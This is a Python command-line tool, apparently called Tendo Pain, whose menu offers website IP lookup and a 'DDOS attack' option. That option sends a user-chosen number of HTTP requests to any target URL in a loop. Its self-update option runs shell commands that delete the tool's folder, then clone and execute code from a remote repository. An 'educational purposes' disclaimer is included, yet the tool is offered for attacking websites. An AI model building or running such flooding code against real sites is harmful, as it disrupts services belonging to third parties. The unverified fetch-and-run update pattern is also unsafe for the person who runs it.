import requests
import socket
import os
import sys
import time
import colorama
colorama.init()
GREEN = colorama.Fore.GREEN
GRAY = colorama.Fore.LIGHTBLACK_EX
RESET = colorama.Fore.RESET
YELLOW = colorama.Fore.YELLOW
BLUE = colorama.Fore.LIGHTBLUE_EX
RED = colorama.Fore.RED
print(RED)
print("""
▀▀█▀▀ █▀▀ █▀▀▄ █▀▀▄ █▀▀█ 　 ░█▀▀█ █▀▀█ ─▀─ █▀▀▄ 
─░█── █▀▀ █──█ █──█ █──█ 　 ░█▄▄█ █▄▄█ ▀█▀ █──█ 
─░█── ▀▀▀ ▀──▀ ▀▀▀─ ▀▀▀▀ 　 ░█─── ▀──▀ ▀▀▀ ▀──▀
""")
print("WARNING: THIS TOOL WAS CREATED FOR EDUCATIONAL PURPOSES,AND I WILL NOT BE RESPONSIBLE FOR ANY DAMAGE CAUSED USING THIS TOOL")
print(f"{GREEN}[✓]TURN ON MOBILE DATA CONNECTION OR WIFI FOR THIS TOOL TO FUNCTION")
print(f".......{RESET}")
time.sleep(7)
def get_ip():
    try:
        print(YELLOW)
        url = input(f"Enter website's url (example: https://www.example.com):{RESET} ")
        hostname = url.split("://")[-1].split("/")[0]
        ip_address = socket.gethostbyname(hostname)
        print(f"{GREEN}[✓] {url}'s ip address is {ip_address}{RESET}")
    except:
        print(RED)
        print("An error occured! \nEnsure the inputted url is correct")
        time.sleep(3)
        print(RESET)
	
def ddos_attack():
    try:
        print(YELLOW)
        url = input(f"Enter website's url (example: https://www.example.com):{RESET} ")
        num_requests = int(input(f"{YELLOW}Enter number of requests to make to {url}:{RESET}"))
        print(RESET)
        for i in range(num_requests):
        	requests.get(url)
        	print(GRAY)
        	print(f"[✓]Sending requests to {url}....")
        print(RESET)
    except:
        print(RED)
        print("An error occured! \nEnsure the inputted url is correct and also make sure number of requests is an integer")
        print(RESET)
        time.sleep(3)
    	
def program_intro():
	os.system("clear")
	print(RED)
	print("""

▀▀█▀▀ █▀▀ █▀▀▄ █▀▀▄ █▀▀█ 　 ░█▀▀█ █▀▀█ ─▀─ █▀▀▄ 
─░█── █▀▀ █──█ █──█ █──█ 　 ░█▄▄█ █▄▄█ ▀█▀ █──█ 
─░█── ▀▀▀ ▀──▀ ▀▀▀─ ▀▀▀▀ 　 ░█─── ▀──▀ ▀▀▀ ▀──▀
""")
	print("""
	𝙆𝙉𝙊𝙒 𝙋𝘼𝙄𝙉❗ 𝘾𝙊𝙉𝙏𝙀𝙈𝙋𝙇𝘼𝙏𝙀 𝙋𝘼𝙄𝙉❗
	""")
	print(RESET)
	print(YELLOW)
	print("*********" * 6)
	print("""
[+] Tool name: Tendo Pain
[+] Author: Solomon Adenuga
[+] Version: 0.1
[+] Github: https://github.com/SoloTech01
[+] Whatsapp: +2348023710562
""")
	print("*********" * 6)
	print(GREEN)
	print("""
[1] Get website ip address
[2] DDOS attack a website
[3] About the tool
[4] Update the tool
[5] Exit the tool
""")
	print(RESET)
	print(BLUE)
	number = input(f">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>Enter a number: >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>{RESET}")
	if number.strip() == "1":
		get_ip()
		print(YELLOW)
		print("Copy the ip address,tendo pain will refresh soon")
		time.sleep(2)
		print("Refreshing.....")
		time.sleep(7)
		print(RESET)
		
	elif number.strip() == "2":
		ddos_attack()
		print(YELLOW)
		print("Refreshing.....")
		time.sleep(3)
		print(RESET)
		
	elif number.strip() == "3":
		print(GREEN)
		print("""
Tendo Pain a tool written in python for getting websites' ip adressses and initializing ddos attacks on websites
""")
		time.sleep(5)
		print("Thanks for using Tendo Pain,kindly follow me on github: SoloTech01")
		print("Refreshing.....")
		time.sleep(5)
		print(RESET)
	elif number.strip() == "4":
		print(GREEN)
		print(f"Updating Tendo Pain.....{RESET}")
		time.sleep(2)
		os.system("""
		cd -
		rm -rf TendoPain
		git clone https://github.com/SoloTech01/TendoPain.git
		cd TendoPain
		python3 TendoPain.py
			""")
		
	elif number.strip() == "5":
		print(RED)
		print("Terminating....")
		time.sleep(2)
		print(RESET)
		sys.exit()
		
		
while True:
	program_intro()